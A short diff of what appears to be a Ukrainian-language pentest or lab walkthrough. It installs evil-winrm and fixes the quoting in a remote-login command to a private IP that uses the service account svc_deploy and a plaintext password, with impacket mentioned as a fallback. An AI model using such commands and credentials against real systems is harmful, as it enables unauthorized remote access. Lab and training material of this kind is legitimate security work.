@@ -163,9 +163,9 @@ exit
 sudo apt install -y libreadline-dev ruby-dev ruby-full && sudo gem install evil-winrm
 ```
 
-Підключення через evil-winrm:
+Підключення через evil-winrm (одинарні лапки!):
 ```
-evil-winrm -i 10.10.50.150 -u svc_deploy -p "Deploy@2024!Drone"
+evil-winrm -i 10.10.50.150 -u svc_deploy -p 'Deploy@2024!Drone'
 ```
 
 АБО через impacket (якщо evil-winrm не встановився):
